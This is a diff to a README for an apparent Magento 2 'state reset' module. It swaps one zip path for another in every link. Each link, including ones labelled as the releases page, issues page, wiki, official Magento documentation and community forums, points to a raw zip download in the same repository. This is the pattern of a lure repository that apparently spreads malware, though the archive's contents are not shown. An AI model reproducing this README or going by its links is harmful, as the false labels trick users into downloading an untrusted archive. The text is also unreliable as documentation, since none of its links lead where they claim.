@@ -1,6 +1,6 @@
 # 🚀 magento2-application - Easy State Reset for Magento 2
 
-[![Download magento2-application](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip)](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip)
+[![Download magento2-application](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip)](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip)
 
 ## 📄 Description
 
@@ -32,13 +32,13 @@ To get started, follow these steps carefully. You will need basic computer skill
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip) to download the latest version of magento2-application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip) to download the latest version of magento2-application.
    
 2. **Choose Your Version:** Look for the latest version listed on the page. Click on it to open the details.
 
 3. **Download the Module:** Click on the link or button that says **Download**. The file will start downloading to your computer. 
 
-4. **Locate the File:** Once the download is complete, check your "Downloads" folder (or the location you specified) for the downloaded file named something like `https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip`.
+4. **Locate the File:** Once the download is complete, check your "Downloads" folder (or the location you specified) for the downloaded file named something like `https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip`.
 
 5. **Extract the Files:** Right-click on the zipped file and select "Extract All" (or a similar option). This will create a new folder with the extracted files.
 
@@ -68,18 +68,18 @@ To get started, follow these steps carefully. You will need basic computer skill
 
 ## 📫 Support & Issues
 
-If you encounter any issues or have questions regarding the module, please feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip). Our team is here to help you.
+If you encounter any issues or have questions regarding the module, please feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip). Our team is here to help you.
 
 ## 🌐 More Information
 
-For detailed documentation and examples of how to use this module, please refer to the README file included in the download or check our [Wiki section](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip).
+For detailed documentation and examples of how to use this module, please refer to the README file included in the download or check our [Wiki section](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip).
 
 ## 🔗 Additional Links
 
 For more tools and resources related to Magento development, explore the following links:
 
-- [Magento 2 Official Documentation](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip)
-- [Community Forums](https://raw.githubusercontent.com/RBT-69/magento2-application/main/Iddio/magento2-application.zip)
+- [Magento 2 Official Documentation](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip)
+- [Community Forums](https://raw.githubusercontent.com/RBT-69/magento2-application/main/App/magento_application_v3.6-alpha.3.zip)
 
 ## 🔄 Stay Updated
 
